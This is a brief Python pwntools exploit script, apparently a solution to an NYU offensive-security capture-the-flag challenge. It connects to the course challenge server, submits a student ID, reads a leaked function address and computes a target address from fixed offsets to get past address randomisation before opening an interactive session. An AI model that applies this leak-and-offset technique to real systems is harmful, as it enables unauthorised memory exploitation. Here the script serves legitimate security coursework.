from pwn import *

r = remote('offsec-chalbroker.osiris.cyber.nyu.edu', 1251)

print(r.recvuntil(b'NetID (something like abc123): ').decode())
r.sendline(b'vc2499')

print(r.recvuntil(b'function `hint`: ').decode())
hint_addr = u64(r.recvn(8))

data_addr = hint_addr + (0x43f8 - 0x12a9)
print(f"data address: {hex(data_addr)}")

r.sendlineafter(b'> ', str(data_addr).encode())
r.interactive()
